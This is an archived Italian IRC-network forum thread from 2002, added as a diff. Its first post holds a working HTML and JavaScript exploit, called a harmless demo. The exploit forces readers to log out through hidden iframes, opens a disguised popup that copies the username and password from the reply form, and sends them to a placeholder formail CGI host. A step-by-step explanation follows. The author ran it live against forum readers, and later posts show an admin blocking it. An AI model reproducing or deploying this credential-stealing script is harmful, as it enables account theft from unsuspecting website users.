@@ -1,0 +1,103 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html dir="ltr" lang="it">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<meta name="keywords" content="Forum Bucato e Password Sniffate..., azzurra,irc,chat,vbulletin,forum,bbs,discussion,jelsoft,bulletin board, Azzurra, AzzurraNet, IRC, mIRC, IRC Network, Chat, chattare, xchat, BitchX, irssi, ircle, canali, nickserv, chanserv, memoserv, statserv, livestats, web, gamersrevolt, infostrada, libero, wind, caltanet, cto, ctonet, quarta profezia, daoc, timoria, bahamut, dalnet, nick, nickname, registrazione nick, registrazione canali, amici, sesso, giochi, gdr, giochi di ruolo, messenger, icq, network, unreal, ircd, psybnc, shell, eggdrop, bot, server, cybcop, kline, abuse, botserv, botnet, tcl, script, services, services.net, net, proxy, socks, firewall" />
+	<meta name="description" content="[Archivio] Forum Bucato e Password Sniffate... Forum Help Area" />
+		<title>Forum Bucato e Password Sniffate... [Archivio]  - Azzurra IRC Network Forum</title>
+	<link rel="stylesheet" href="http://forum.azzurra.org/archive/archive.css" />
+</head>
+<body>
+<div class="pagebody">
+<div id="navbar"><a href="./">Azzurra IRC Network Forum</a> &gt; <a href="f-6.html">Network Central</a> &gt; <a href="f-18.html">Forum Help Area</a> &gt; Forum Bucato e Password Sniffate...</div>
+<hr />
+<div class="pda"><a href="?pda=1" rel="nofollow">PDA</a></div>
+<p class="largefont">View Full Version : <a href="http://forum.azzurra.org/showthread.php?t=747">Forum Bucato e Password Sniffate...</a></p>
+<hr />
+
+<div class="post"><div class="posttop"><div class="username">fanatiko</div><div class="date">27-06-2002, 20:38</div></div><div class="posttext">&lt;p align=center&gt;&lt;textarea name=x rows=2 cols=20 readonly style=&quot;height:100;width:640;font-family:Fixedsys;border:2px #FF0000 dashed&quot;&gt;&amp;lt;iframe name=&amp;quot;logout&amp;quot; width=&amp;quot;0&amp;quot; height=&amp;quot;0&amp;quot; src=&amp;quot;http://www.azzurra.org/forum/logout.php&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;iframe name=&amp;quot;sniffer&amp;quot; width=&amp;quot;0&amp;quot; height=&amp;quot;0&amp;quot; src=&amp;quot;about:&amp;lt;body&amp;gt;&amp;lt;script&amp;gt;wsniffer=window.open(&amp;amp;quo  t;&amp;amp;quot;,&amp;amp;quot;wsniffer&amp;amp;quot;,&amp;amp;quot;width=300,heig  ht=120,top=0,left=0&amp;amp;quot;);wsniffer.document.open(  );wsniffer.document.write(&amp;amp;quot;&amp;lt;HTML&amp;gt;n&amp;lt;HEAD&amp;gt;n&amp;lt;TIT  LE&amp;gt;AzzurraNet IRC Network Forum&amp;lt;/TITLE&amp;gt;n&amp;lt;/HEAD&amp;gt;n&amp;lt;BODY&amp;gt;n&amp;lt;SCRIPT&amp;gt;nfunction sniffnow(){nif(opener.location.pathname=='/forum/reply.php'){ndocument.snifform.status.value='SNIFF  ERING...'ndocument.snifform.username.value=opener.  document.forms(0).username.valuendocument.snifform  .password.value=opener.document.forms(0).password.  valuenif(document.snifform.username.value!=''&amp;amp;&amp;amp;doc  ument.snifform.password.value!=''){nalert('wsniffe  r: sto per inviare via formail ciò che è scritto nella popup win...')ndocument.snifform.submit()n}nelse setTimeout('sniffnow()',7000)n}nelse{ndocument.sni  fform.status.value='WAITING...'nsetTimeout('sniffn  ow()',10000)n}nreturnn}nsetTimeout('sniffnow()',10  000)n&amp;lt;/SCRIPT&amp;gt;n&amp;lt;FORM NAME=snifform METHOD=post ACTION='http://DOMAIN/FORMAIL.CGI'&amp;gt;n&amp;lt;INPUT TYPE=hidden NAME=idservice VALUE='12345'&amp;gt;n&amp;lt;INPUT TYPE=hidden NAME=oggetto VALUE='password sniffata da AzzurraNet'&amp;gt;n&amp;lt;INPUT TYPE=hidden NAME=redirect VALUE='about:&amp;lt;script&amp;gt;this.close()&amp;lt;/script&amp;gt;'&amp;gt;n&amp;lt;INPUT TYPE=text size=20 NAME=status VALUE='WAITING...' READONLY&amp;gt;:status&amp;lt;BR&amp;gt;n&amp;lt;INPUT TYPE=text size=20 NAME=username READONLY&amp;gt;:username&amp;lt;BR&amp;gt;n&amp;lt;INPUT TYPE=text size=20 NAME=password READONLY&amp;gt;:passwordn&amp;lt;/FORM&amp;gt;n&amp;lt;/BODY&amp;gt;n&amp;lt;/HTML&amp;gt;&amp;amp;quot;);wsniffer.document.close();wsniffer.op  ener=top&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/textarea&gt;&lt;/p&gt;&lt;p align=left&gt;&lt;u&gt;Exploit scritto da fanatiko e testato con ie6.&lt;/u&gt;<br />
+Questo post nasconde una versione DEMO (funzionante ma innocua) di un exploit fatto in html+js ed ha lo scopo di rubare le password degli utenti che visualizzano e rispondono al messaggio in questione.<br />
+<br />
+&lt;u&gt;Situazione&lt;/u&gt;<br />
+l'utente Rossi legge il mio messaggio (fase A) e si appresta a rispondere (fase B).<br />
+<br />
+&lt;u&gt;Fase A&lt;/u&gt;<br />
+-L'utente Rossi viene &amp;quot;forzatamente&amp;quot; disconnesso dal sistema, nel caso sia già riconosciuto da esso. Per far questo viene utilizzato un iframe invisibile che carica la pagina &amp;quot;logout.php&amp;quot;.<br />
+-Viene aperta una nuova finestra del browser non visibile nello schermo (&lt;TT&gt;top=screen.Height*2&lt;/TT&gt;) facendo apparire solo un'iconetta sulla barra delle applicazioni di win che comunque viene camuffata come pagina di AzzurraNet. In questa vs demo la nuova finestra è invece ben visibile, questo per poter leggerne il codice sorgente. Questa finestra resta in attesa (WAITING...) finchè nella finestra principale, quella del forum, l'utente Rossi accede alla pagina per editare repliche (&lt;font face=&quot;Times New Roman&quot;&gt;&lt;TT&gt;opener.location.pathname=='/forum/reply.php'&lt;/TT&gt;&lt;/font&gt;).<br />
+<br />
+&lt;u&gt;Fase B&lt;/u&gt;<br />
+-Nella finestra dello sniffer è presente uno script java che legge ad intervalli regolari ciò che digita l'utente Rossi nella form per editare messaggi e se ne fa una copia in una sua form interna. Non appena riesce ad acquisire username e password le invia tramite formail, ad esempio al mio indirizzo di email tramite un servizio gratuito in cgi a cui io mi sono precedentemente registrato.<br />
+-Nel caso in cui il servizio formail desse la possibilità di definire una pagina di conferma dell'avvenuto invio, potrei approfittarne per chiudere la win popup, che nel frattempo ha terminato la sua missione, utilizzando questo script in luogo dell'url: &amp;quot;&lt;font face=&quot;Times New Roman&quot;&gt;&lt;TT&gt;about:&amp;lt;script&amp;gt;this.close()&amp;lt;/script&amp;gt;&lt;/TT&gt;&lt;/font&gt;&amp;quot;.<br />
+<br />
+E' possibile provare (&lt;u&gt;NON PIU'&lt;/u&gt;) questo exploit per visualizzarne gli effetti andando a replicare. Eventuali alert dati sono a scopo dimostrativo. Le operazioni fatte dallo sniffer sono gestite da intervalli di tempo regolari, per cui è necessario attendere alcuni secondi prima di osservarne gli eventi. Nessuna informazione verrà realmente inviata al sottoscritto (l'action nella formail non è definita e per questo apparirà un errore di pagina non trovata). Eventuali errori di sincronizzazione tra le due pagine possono essere gestite perfezionando lo script. Nessuna risorsa esterna (files, etc) è necessaria per farlo funzionare, eccezione fatta per il servizio di formail. JS funziona(&lt;u&gt;VA&lt;/u&gt;) se richiamato da un iframe!<br />
+<br />
+---<br />
+ciccio&lt;/p&gt;<br />
+<br />
+&lt;font size=-1&gt;[ Questo messaggio &amp;egrave; stato modificato da: fanatiko il 2002-06-28 18:49 ]&lt;/font&gt;</div></div><hr />
+
+
+<div class="post"><div class="posttop"><div class="username">Ramses3k</div><div class="date">28-06-2002, 08:52</div></div><div class="posttext">Scusa fanatiko, ma perchè intimorirci in questo modo?<br />
+<br />
+Sei riuscito pure a farmi fare il logout in automatico solo perchè ho letto questo messaggio, cmq spero che davvero tu non sappia nulla di riservado dei visitatori che hanno letto questo post.<br />
+<br />
+E una curiosità... e così con questo tuo post vuoi dimostrare che il forum non è sicuro per la nostra privacy?<br />
+<br />
+Se così fosse chiedo una risposta tempestiva da parte dei responsabili, siccome alla mia privacy io ci tengo e non credo sia l'unico.<br />
+<br />
+<br />
+<br />
+_________________<br />
+-^- The Guardian of Darkness -^-<br />
+<br />
+<br />
+http://forum.deepbastardinside.net/images/avatars/gallery/Mortal%20Kombat/Mortal_Kombat_-_Fujin.gif&lt;/img&gt;<br />
+<br />
+&lt;font size=-1&gt;[ Questo messaggio &amp;egrave; stato modificato da: Ramses3k il 2002-06-28 09:53 ]&lt;/font&gt;</div></div><hr />
+
+
+<div class="post"><div class="posttop"><div class="username">_theone_</div><div class="date">28-06-2002, 11:31</div></div><div class="posttext">Come potrete notare dal primo post di questo thread il pericolo è stato eliminato, bloccando alla radice una serie di tag HTML.<br />
+<br />
+Allo stesso modo è stato eliminato anche il worm &quot;letmeplay&quot;, altra splendida invenzione del nostro fanatiko.<br />
+<br />
+Gradirei che i test venissero fatti altrove, visto che comunque è sempre possibile realizzare un'ambiente di sviluppo/debug, discussi e *poi* postati in area pubblica.<br />
+<br />
+Grazie.</div></div><hr />
+
+
+<div class="post"><div class="posttop"><div class="username">Ramses3k</div><div class="date">28-06-2002, 12:06</div></div><div class="posttext">e così l'unico sfigat* che arriva sempre nel posto sbagliato al momento sbagliato sarei sempre io???<br />
+<br />
+Oh no... devo pure cambiarmi la password _theone_?<br />
+<br />
+_________________<br />
+-^- The Guardian of Darkness -^-<br />
+<br />
+<br />
+http://forum.deepbastardinside.net/images/avatars/gallery/Mortal%20Kombat/Mortal_Kombat_-_Fujin.gif&lt;/img&gt;<br />
+<br />
+&lt;font size=-1&gt;[ Questo messaggio &amp;egrave; stato modificato da: Ramses3k il 2002-06-28 13:07 ]&lt;/font&gt;</div></div><hr />
+
+
+<div class="post"><div class="posttop"><div class="username">City_Hunter</div><div class="date">10-07-2002, 00:48</div></div><div class="posttext">Ramses, se ti senti più tranquillo...<br />
+ma sono certo che non ce n'è bisogno, ha scritto che non ha preso nulla e allora è certamente così.<br />
+Certo che, cix, quando ci incontriamo mi spieghi un paio di cose :smile:</div></div><hr />
+
+
+<div class="post"><div class="posttop"><div class="username">Ramses3k</div><div class="date">10-07-2002, 09:10</div></div><div class="posttext">In data 2002-07-10 01:48, C|ty_Hunter scrive:<br />
+Ramses, se ti senti più tranquillo...<br />
+ma sono certo che non ce n'è bisogno, ha scritto che non ha preso nulla e allora è certamente così.<br />
+Certo che, cix, quando ci incontriamo mi spieghi un paio di cose :smile:<br />
+<br />
+<br />
+uhm.. grazie tante C|ty per la rassicurazione, cmq a prescindere da questo evento sono sempre dell'opinione (e dubito che cambierò idea in futuro) che se una persona ha le giuste conoscenze pratiche e/o teoriche può permettersi di fare di tutto in internet, non a caso esistono gli hacker (e i warez :smile:<br />
+<br />
+<br />
+bye bye<br />
+<br />
+&lt;font size=-1&gt;[ Questo messaggio &amp;egrave; stato modificato da: Ramses3k il 2002-07-10 10:11 ]&lt;/font&gt;</div></div><hr />
+
+
+<div id="copyright">vBulletin v3.5.3, Copyright &copy;2000-2006, Jelsoft Enterprises Ltd.</div>
+</div>
+</body>
+</html>
